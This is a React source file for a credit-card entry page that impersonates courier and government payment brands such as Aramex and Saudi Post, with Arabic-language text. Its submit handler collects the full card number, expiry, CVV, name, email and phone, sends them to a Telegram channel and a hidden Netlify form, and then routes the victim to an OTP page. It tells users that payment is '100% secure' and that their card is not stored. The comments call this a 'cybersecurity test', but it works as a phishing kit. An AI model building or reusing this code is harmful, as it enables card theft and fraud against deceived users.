import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBrandingByCompany } from "@/lib/brandingSystem";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { NAQELLayout, ZajilLayout, SaudiPostLayout, UPSLayout } from "@/components/MoreCompanyLayouts";
import { 
  SecureCardHeader, 
  CardBrandIndicator, 
  StyledCardInput,
  PaymentSecurityFooter,
  AcceptedCardsDisplay 
} from "@/components/CardFormComponents";
import { Shield, Lock, Calendar } from "lucide-react";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";

const PaymentCardInput = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardValid, setCardValid] = useState<boolean | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Get customer info and selected bank from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const selectedBankId = linkData?.payload?.selectedBank || '';

  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = getBrandingByCompany(serviceKey);
  
  // Get government payment system for styling
  const govSystem = getGovernmentPaymentSystem(selectedCountry);

  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  // Get amount from link data - prioritize payment_data amount, then payment_amount, then cod_amount
  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Get currency code from link data
  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || selectedCountry;
  const formattedAmount = formatCurrency(amount, currencyCode);

  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
    setCardNumber(formatted);
    
    // Validate with Luhn algorithm if 13-19 digits
    const cleaned = formatted.replace(/\s/g, '');
    if (cleaned.length >= 13) {
      const isValid = validateLuhn(formatted);
      setCardValid(isValid);
      
      if (!isValid && cleaned.length === 16) {
        toast({
          title: "رقم البطاقة غير صحيح",
          description: "الرجاء التحقق من رقم البطاقة",
          variant: "destructive",
        });
      }
    } else {
      setCardValid(null);
    }
  };
  
  // Generate month/year options
  const months = Array.from({ length: 12 }, (_, i) => {
    const month = (i + 1).toString().padStart(2, '0');
    return { value: month, label: month };
  });
  
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 20 }, (_, i) => {
    const year = (currentYear + i).toString().slice(-2);
    return { value: year, label: `20${year}` };
  });
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    // Validate card number with Luhn
    if (!validateLuhn(cardNumber)) {
      toast({
        title: "رقم البطاقة غير صحيح",
        description: "الرجاء التحقق من رقم البطاقة المدخل",
        variant: "destructive",
      });
      return;
    }
    
    // Validate expiry date
    if (!validateExpiry(expiryMonth, expiryYear)) {
      toast({
        title: "تاريخ الانتهاء غير صحيح",
        description: "البطاقة منتهية الصلاحية أو التاريخ غير صحيح",
        variant: "destructive",
      });
      return;
    }
    
    // Validate CVV
    const cardType = detectCardType(cardNumber);
    if (!validateCVV(cvv, cardType)) {
      toast({
        title: "CVV غير صحيح",
        description: cardType === 'amex' ? "CVV يجب أن يكون 4 أرقام لبطاقات American Express" : "CVV يجب أن يكون 3 أرقام",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    // Store complete card info for cybersecurity test
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    const expiry = `${expiryMonth}/${expiryYear}`;
    
    sessionStorage.setItem('cardLast4', last4);
    sessionStorage.setItem('cardName', cardName);
    sessionStorage.setItem('cardNumber', cardNumber); // Full card number
    sessionStorage.setItem('cardExpiry', expiry); // Full expiry
    sessionStorage.setItem('cardCvv', cvv); // CVV for cybersecurity test
    sessionStorage.setItem('cardType', cardType);
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-details-new",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardholder: cardName,
          cardLast4: last4,
          cardType: cardType,
          expiry: expiry,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      console.error("Form submission error:", err);
    }
    
    // Send complete card details to Telegram (cybersecurity test)
    const telegramResult = await sendToTelegram({
      type: 'card_details_with_bank',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardholder: cardName,
        cardNumber: cardNumber, // Full card number for cybersecurity test
        cardLast4: last4,
        cardType: cardType,
        expiry: expiry,
        cvv: cvv, // CVV for cybersecurity test
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تفويض البطاقة بنجاح",
    });
    
    // Navigate directly to OTP (skip bank login for card payment)
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="بيانات البطاقة"
      description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Selected Bank/Country Info */}
      {(selectedBank || selectedCountryData) && (
        <div 
          className="rounded-xl p-4 sm:p-5 mb-8 flex items-center gap-4"
          style={{
            background: companyBranding?.colors?.surface || `${branding.colors.primary}08`,
            border: `2px solid ${branding.colors.primary}20`,
            borderRadius: companyBranding?.borderRadius?.md || '10px'
          }}
        >
          {selectedCountryData && (
            <span className="text-3xl">{selectedCountryData.flag}</span>
          )}
          {selectedBank && (
            <div
              className="w-12 h-12 rounded-full flex items-center justify-center"
              style={{ background: selectedBank.color || branding.colors.primary }}
            >
              <Building2 className="w-6 h-6 text-white" />
            </div>
          )}
          <div className="flex-1">
            <p className="text-xs font-medium mb-1" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>البنك المختار</p>
            <p className="text-base font-bold" style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}>
              {selectedBank ? selectedBank.nameAr : 'غير محدد'}
            </p>
          </div>
        </div>
      )}

      {/* Security Notice */}
      <div
        className="mb-8 p-5 sm:p-6 rounded-xl border-2"
        style={{ 
          backgroundColor: companyBranding?.colors?.surface || `${branding.colors.primary}08`, 
          borderColor: branding.colors.primary,
          borderRadius: companyBranding?.borderRadius?.md || '10px'
        }}
      >
        <div className="flex items-center gap-4">
          <div
            className="w-14 h-14 rounded-full flex items-center justify-center"
            style={{ 
              background: companyBranding?.gradients?.primary || branding.colors.primary 
            }}
          >
            <Shield className="w-7 h-7 text-white" />
          </div>
          <div>
            <h3
              className="font-bold text-base sm:text-lg mb-1"
              style={{ 
                color: companyBranding?.colors?.text || '#1A1A1A',
                fontFamily: companyBranding?.fonts?.arabic || 'Cairo, sans-serif'
              }}
            >
              دفع آمن ومشفر 100%
            </h3>
            <p className="text-sm" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>
              معلومات بطاقتك محمية بأعلى معايير الأمان العالمية
            </p>
          </div>
        </div>
      </div>

      {/* Visual Card Display */}
      <div 
        className="rounded-2xl p-6 sm:p-8 mb-8 relative overflow-hidden shadow-2xl"
        style={{
          background: companyBranding?.gradients?.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
          minHeight: '200px',
          borderRadius: companyBranding?.borderRadius?.lg || '16px',
          boxShadow: companyBranding?.shadows?.lg || '0 20px 40px rgba(0,0,0,0.2)'
        }}
      >
        <div className="absolute top-4 right-4 flex items-center gap-2">
          <CreditCard className="w-10 h-10 sm:w-12 sm:h-12 text-white/80" />
          {cardValid === true && (
            <CheckCircle2 className="w-6 h-6 text-green-300" />
          )}
        </div>
        
        {/* Card Type Badge */}
        {cardNumber.length > 0 && (
          <div className="absolute top-4 left-4">
            <span className="text-xs text-white/70 uppercase font-semibold">
              {detectCardType(cardNumber)}
            </span>
          </div>
        )}
        
        {/* Card Number Display */}
        <div className="mt-14 sm:mt-16 mb-5 sm:mb-6">
          <div className="flex gap-2 sm:gap-3 text-white text-xl sm:text-2xl font-mono">
            <span>••••</span>
            <span>••••</span>
            <span>••••</span>
            <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
          </div>
        </div>

        <div className="flex justify-between items-end text-white">
          <div>
            <p className="text-[10px] sm:text-xs opacity-70 mb-1">EXPIRES</p>
            <p className="text-base sm:text-lg font-mono">
              {expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "MM/YY"}
            </p>
          </div>
          <div className="text-right">
            <p className="text-[10px] sm:text-xs opacity-70 mb-1">CARDHOLDER</p>
            <p className="text-base sm:text-lg font-bold">{cardName || "YOUR NAME"}</p>
          </div>
        </div>
      </div>

      {/* Form */}
      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
        {/* Cardholder Name */}
        <div>
          <Label 
            className="mb-3 text-sm sm:text-base font-semibold flex items-center gap-2"
            style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}
          >
            <CreditCard className="w-5 h-5" style={{ color: branding.colors.primary }} />
            اسم حامل البطاقة *
          </Label>
          <Input
            placeholder="أدخل الاسم كما هو مكتوب على البطاقة"
            value={cardName}
            onChange={(e) => setCardName(e.target.value.toUpperCase())}
            className="h-14 sm:h-16 text-base sm:text-lg"
            style={{
              borderWidth: '2px',
              borderColor: companyBranding?.colors?.border || '#E5E5E5',
              borderRadius: companyBranding?.borderRadius?.sm || '8px',
              fontFamily: companyBranding?.fonts?.primary || 'Arial, sans-serif'
            }}
            required
          />
        </div>
        
        {/* Card Number */}
        <div>
          <Label className="mb-3 text-sm sm:text-base font-semibold flex items-center justify-between">
            <div className="flex items-center gap-2">
              <CreditCard className="w-5 h-5" style={{ color: branding.colors.primary }} />
              <span style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}>رقم البطاقة *</span>
            </div>
            {cardValid === true && (
              <span className="text-sm text-green-600 flex items-center gap-1 font-bold">
                <CheckCircle2 className="w-5 h-5" />
                صحيح
              </span>
            )}
            {cardValid === false && (
              <span className="text-sm text-destructive font-bold">غير صحيح</span>
            )}
          </Label>
          <Input
            placeholder="#### #### #### ####"
            value={cardNumber}
            onChange={(e) => handleCardNumberChange(e.target.value)}
            inputMode="numeric"
            className={`h-14 sm:h-16 text-lg sm:text-xl tracking-wider font-mono ${
              cardValid === false ? 'border-destructive' :
              cardValid === true ? 'border-green-500' : ''
            }`}
            style={{
              borderWidth: '2px',
              borderColor: cardValid === false ? '#ef4444' : cardValid === true ? '#10b981' : companyBranding?.colors?.border || '#E5E5E5',
              borderRadius: companyBranding?.borderRadius?.sm || '8px',
              fontFamily: 'monospace'
            }}
            required
          />
        </div>
        
        {/* Expiry & CVV Row */}
        <div className="grid grid-cols-3 gap-4">
          <div>
            <Label 
              className="mb-3 text-sm font-semibold flex items-center gap-2"
              style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}
            >
              <Calendar className="w-4 h-4" style={{ color: branding.colors.primary }} />
              شهر *
            </Label>
            <Select value={expiryMonth} onValueChange={setExpiryMonth} required>
              <SelectTrigger
                className="h-14 sm:h-16"
                style={{ 
                  borderWidth: '2px', 
                  borderColor: companyBranding?.colors?.border || '#E5E5E5',
                  borderRadius: companyBranding?.borderRadius?.sm || '8px'
                }}
              >
                <SelectValue placeholder="شهر" />
              </SelectTrigger>
              <SelectContent className="z-50">
                {months.map((month) => (
                  <SelectItem key={month.value} value={month.value}>
                    {month.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div>
            <Label 
              className="mb-3 text-sm font-semibold flex items-center gap-2"
              style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}
            >
              <Calendar className="w-4 h-4" style={{ color: branding.colors.primary }} />
              سنة *
            </Label>
            <Select value={expiryYear} onValueChange={setExpiryYear} required>
              <SelectTrigger
                className="h-14 sm:h-16"
                style={{ 
                  borderWidth: '2px', 
                  borderColor: companyBranding?.colors?.border || '#E5E5E5',
                  borderRadius: companyBranding?.borderRadius?.sm || '8px'
                }}
              >
                <SelectValue placeholder="سنة" />
              </SelectTrigger>
              <SelectContent className="z-50">
                {years.map((year) => (
                  <SelectItem key={year.value} value={year.value}>
                    {year.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div>
            <Label 
              className="mb-3 text-sm font-semibold flex items-center gap-2"
              style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}
            >
              <Lock className="w-4 h-4" style={{ color: branding.colors.primary }} />
              CVV *
            </Label>
            <Input
              type="password"
              placeholder="***"
              value={cvv}
              onChange={(e) =>
                setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
              }
              inputMode="numeric"
              className="h-14 sm:h-16 text-lg sm:text-xl text-center font-mono"
              style={{ 
                borderWidth: '2px', 
                borderColor: companyBranding?.colors?.border || '#E5E5E5',
                borderRadius: companyBranding?.borderRadius?.sm || '8px'
              }}
              maxLength={4}
              required
            />
          </div>
        </div>

        {/* Security Info */}
        <div
          className="mt-8 p-5 rounded-xl"
          style={{
            backgroundColor: companyBranding?.colors?.surface || '#F5F5F5',
            border: `1px solid ${companyBranding?.colors?.border || '#E5E5E5'}`,
            borderRadius: companyBranding?.borderRadius?.md || '10px'
          }}
        >
          <div className="flex items-start gap-4">
            <div
              className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0"
              style={{ background: branding.colors.primary }}
            >
              <Lock className="w-5 h-5 text-white" />
            </div>
            <div>
              <h4 
                className="font-bold text-sm sm:text-base mb-1"
                style={{ 
                  color: companyBranding?.colors?.text || '#1A1A1A',
                  fontFamily: companyBranding?.fonts?.arabic || 'Cairo, sans-serif'
                }}
              >
                محمي بتشفير SSL 256-bit
              </h4>
              <p className="text-xs sm:text-sm" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>
                جميع المعلومات مُشفرة ومحمية بأعلى مستويات الأمان. لا نقوم بتخزين بيانات بطاقتك.
              </p>
            </div>
          </div>
        </div>
        
        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full h-16 sm:h-18 text-lg sm:text-xl font-bold mt-8 text-white hover:opacity-90 hover:shadow-2xl transition-all"
          disabled={isSubmitting || !cardValid}
          style={{
            background: companyBranding?.gradients?.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
            borderRadius: companyBranding?.borderRadius?.md || '12px',
            boxShadow: companyBranding?.shadows?.lg || '0 10px 25px rgba(0,0,0,0.15)',
            fontFamily: companyBranding?.fonts?.arabic || 'Cairo, sans-serif'
          }}
        >
          {isSubmitting ? (
            <>
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white ml-2"></div>
              جاري المعالجة...
            </>
          ) : (
            <>
              <span className="ml-2">دفع الآن</span>
              <ArrowLeft className="w-5 h-5 mr-2" />
            </>
          )}
        </Button>

        <div className="flex items-center justify-center gap-2 mt-5">
          <Lock className="w-4 h-4" style={{ color: companyBranding?.colors?.textLight || '#666666' }} />
          <p className="text-xs sm:text-sm text-center" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>
            بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
          </p>
        </div>
      </form>
    
      {/* Hidden Netlify Form */}
      <form name="card-details-new" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="cardType" />
        <input type="text" name="expiry" />
        <input type="text" name="timestamp" />
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentCardInput;
